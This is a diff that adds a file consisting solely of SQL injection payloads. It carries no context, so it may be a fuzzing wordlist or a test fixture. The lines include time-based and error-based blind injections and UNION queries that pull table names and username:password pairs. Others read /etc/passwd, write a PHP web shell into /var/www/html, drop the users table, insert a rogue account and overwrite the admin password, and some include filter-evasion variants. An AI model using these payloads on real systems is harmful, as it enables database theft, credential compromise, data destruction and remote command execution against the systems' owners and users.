@@ -1,0 +1,51 @@
+1'; WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'#
+1'; SELECT pg_sleep(5)--
+1' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--
+1' AND 1=(SELECT COUNT(*) FROM mysql.user)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+1' AND extractvalue(1,concat(0x7e,database()))--
+1' AND updatexml(1,concat(0x7e,database()),1)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+1' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--
+1" AND SLEEP(5)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users')--
+1' AND 1=1 INTO OUTFILE '/tmp/test.txt'--
+1'; DROP TABLE users; --
+1'; INSERT INTO users VALUES('hacker','pass')--
+1'; UPDATE users SET password='owned' WHERE username='admin'--
+1' OR 1=1 LIMIT 1 --
+1' OR 1=1 ORDER BY 1 --
+1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+1' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+1' UNION SELECT LOAD_FILE('/etc/passwd')--
+1' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--
+1' OR '1'='1'/* comment */
+1' OR '1'='1'# comment
+1' OR '1'='1'%23 comment
+1' OR '1'='1'%2D%2D comment
+1' OR 1=1%00
+1' OR 1=1%23
+1' OR 1=1-- -
+1'/*!OR*/1=1--
+1' OR 1=1 AND '1'='1
+1' OorR 1=1--
+1' O/**/R 1=1--
+1' OR 1=1 AND SLEEP(5)--
+1' XOR SLEEP(5)--
+1' XOR 1=1--
+1' XOR 1=2--
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='2
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) OR '1'='1
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) XOR '1'='1
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND SLEEP(5)--
+1' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1
+1' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) OR '1'='1
